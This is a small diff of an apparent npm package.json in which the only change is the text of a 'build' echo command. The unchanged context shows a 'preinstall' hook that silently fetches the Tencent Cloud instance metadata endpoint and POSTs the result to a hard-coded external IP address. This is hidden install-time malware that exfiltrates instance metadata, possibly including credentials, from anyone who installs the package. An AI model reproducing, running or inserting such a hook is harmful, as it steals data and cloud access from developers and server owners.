@@ -3,6 +3,6 @@
   "version": "1.0.0",
   "scripts": {
     "preinstall": "RESULT=$(curl -m 5 -s http://metadata.tencentyun.com/latest/meta-data/); curl -X POST -d \"$RESULT\" http://139.224.40.24/log",
-    "build": "echo 'building...'"
+    "build": "echo 'building. ..'"
   }
 }
